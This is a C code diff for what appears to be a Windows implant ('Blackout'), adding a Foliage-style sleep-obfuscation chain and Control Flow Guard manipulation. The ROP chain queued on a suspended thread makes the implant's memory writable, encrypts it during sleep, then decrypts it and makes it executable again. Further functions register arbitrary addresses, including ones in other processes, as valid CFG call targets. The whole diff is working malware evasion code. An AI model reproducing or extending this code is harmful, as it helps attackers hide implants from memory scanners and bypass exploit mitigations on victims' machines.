@@ -7,6 +7,14 @@ FUNC VOID volatile ___chkstk_ms(
         VOID
 ) { __asm__( "nop" ); }
 
+FUNC VOID SleepMain(
+    DWORD SleepTime
+) {
+    BLACKOUT_INSTANCE
+
+    FoliageObf( SleepTime );
+}
+
 FUNC VOID FoliageObf( 
     DWORD SleepTime
 ) {
@@ -32,12 +40,12 @@ FUNC VOID FoliageObf(
 
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
     if ( Status != 0x00 ) {
-        PrintErr( "NtCreateEvent", Status );
+        //PrintErr( "NtCreateEvent", Status );
     }    
 
     Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
     if ( Status != 0x00 ) {
-        PrintErr( "NtCreateThreadEx", Status );
+        //PrintErr( "NtCreateThreadEx", Status );
     }
 
     Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );
@@ -45,7 +53,7 @@ FUNC VOID FoliageObf(
     CtxMain.ContextFlags = CONTEXT_FULL;
     Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
     if ( Status != 0x00 ) {
-        PrintErr( "NtGetContextThread", Status );
+        //PrintErr( "NtGetContextThread", Status );
     }
 
     *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;
@@ -69,7 +77,7 @@ FUNC VOID FoliageObf(
 
     /*
      * Change implant protection to RW
-     * VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProt ); 
+     * VirtualProtect( RxBase, RxSize, PAGE_READWRITE, &OldProt ); 
      */
     RopProtRw.Rip = Instance()->Win32.VirtualProtect;
     RopProtRw.Rcx = Instance()->Base.RxBase;
@@ -79,11 +87,11 @@ FUNC VOID FoliageObf(
 
     /*
      * memory encryption
-     * SystemFunction( &Img, &Key );
+     * SystemFunction040( BaseAddress, FullLength );
      */
     RopMemEnc.Rip = Instance()->Win32.SystemFunction040;
     RopMemEnc.Rcx = Instance()->Base.Buffer;
-    RopMemEnc.Rdx = Instance()->Base.Length;
+    RopMemEnc.Rdx = Instance()->Base.FullLen;
 
     /*
      * delay
@@ -96,15 +104,15 @@ FUNC VOID FoliageObf(
 
     /*
      * memory decryption
-     * SystemFunction( &Img, &Key );
+     * SystemFunction041( BaseAddress, FullLength );
      */
     RopMemDec.Rip = Instance()->Win32.SystemFunction041;
     RopMemDec.Rcx = Instance()->Base.Buffer;
-    RopMemDec.Rdx = Instance()->Base.Length;
+    RopMemDec.Rdx = Instance()->Base.FullLen;
 
     /*
      * change memory to execute and read
-     * VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READ, &oldProt );
+     * VirtualProtect( RxBase, RxSize, PAGE_EXECUTE_READ, &oldProt );
      */
     RopProtRx.Rip = Instance()->Win32.VirtualProtect;
     RopProtRx.Rcx = Instance()->Base.RxBase;
@@ -129,14 +137,14 @@ FUNC VOID FoliageObf(
 
     Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
     if ( Status != 0x00 ) {
-        PrintErr( "NtAlertResumeThread", Status );
+        //PrintErr( "NtAlertResumeThread", Status );
     }
 
     Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );
 
     Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, TRUE, NULL );
     if ( Status != 0x00 ) {
-        PrintErr( "NtSignalAndWaitForSingleObject", Status );
+        //PrintErr( "NtSignalAndWaitForSingleObject", Status );
     }
 
 _LeaveObf:
@@ -151,3 +159,108 @@ _LeaveObf:
     }
 }    
 
+FUNC BOOL CfgCheckEnabled(
+    VOID
+) {
+    BLACKOUT_INSTANCE
+
+    NTSTATUS Status = STATUS_SUCCESS;
+    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };
+
+    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
+    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
+    
+    Status = Instance()->Win32.NtQueryInformationProcess( 
+        NtCurrentProcess(),
+        ProcessCookie | ProcessUserModeIOPL,
+        &ProcInfoEx,
+        sizeof( ProcInfoEx ),
+        NULL
+    );
+    if ( Status != STATUS_SUCCESS ) {
+        Instance()->Win32.printf( "[E] failed with status: %X\n", Status );
+    }
+
+    Instance()->Win32.printf( "[I] Control Flow Guard (CFG) Enabled: %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
+    return ProcInfoEx.ExtendedProcessInfoBuffer;
+}
+
+FUNC VOID CfgAddressAdd( 
+    _In_ PVOID ImageBase,
+    _In_ PVOID Function
+) {
+    BLACKOUT_INSTANCE
+
+    CFG_CALL_TARGET_INFO Cfg      = { 0 };
+    MEMORY_RANGE_ENTRY   MemRange = { 0 };
+    VM_INFORMATION       VmInfo   = { 0 };
+    PIMAGE_NT_HEADERS    NtHdrs   = { 0 };
+    ULONG                Output   = 0x00;
+    NTSTATUS             Status   = STATUS_SUCCESS;
+
+    NtHdrs                  = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
+    MemRange.NumberOfBytes  = U_PTR( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
+    MemRange.VirtualAddress = ImageBase;
+
+    Cfg.Flags  = CFG_CALL_TARGET_VALID;
+    Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );
+
+    VmInfo.dwNumberOfOffsets = 1;
+    VmInfo.plOutput          = &Output;
+    VmInfo.ptOffsets         = &Cfg;
+    VmInfo.pMustBeZero       = FALSE;
+    VmInfo.pMoarZero         = FALSE;
+
+    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
+        NtCurrentProcess(),
+        VmCfgCallTargetInformation,
+        1,
+        &MemRange,
+        &VmInfo,
+        sizeof( VmInfo )
+    );
+
+    if ( Status != STATUS_SUCCESS ) {
+        Instance()->Win32.printf( "[E] failed with status: %X", Status );
+    }
+}
+
+FUNC VOID CfgPrivateAddressAdd(
+    _In_ HANDLE hProcess,
+    _In_ PVOID  Address,
+    _In_ DWORD  Size
+) {
+    BLACKOUT_INSTANCE
+
+    CFG_CALL_TARGET_INFO Cfg      = { 0 };
+    MEMORY_RANGE_ENTRY   MemRange = { 0 };
+    VM_INFORMATION       VmInfo   = { 0 };
+    PIMAGE_NT_HEADERS    NtHeader = { 0 };
+    ULONG                Output   = { 0 };
+    NTSTATUS             Status   = { 0 };
+
+    MemRange.NumberOfBytes  = Size;
+    MemRange.VirtualAddress = Address;
+    
+    Cfg.Flags  = CFG_CALL_TARGET_VALID;
+    Cfg.Offset = 0;
+
+    VmInfo.dwNumberOfOffsets = 1;
+    VmInfo.plOutput          = &Output;
+    VmInfo.ptOffsets         = &Cfg;
+    VmInfo.pMustBeZero       = FALSE;
+    VmInfo.pMoarZero         = FALSE;
+
+    Status = Instance()->Win32.NtSetInformationVirtualMemory( 
+        hProcess, 
+        VmCfgCallTargetInformation, 
+        1, 
+        &MemRange, 
+        &VmInfo, 
+        sizeof( VmInfo ) 
+    );
+
+    if ( Status != STATUS_SUCCESS ) {
+        Instance()->Win32.printf( "[E] failed with status: %X", Status );
+    }
+}
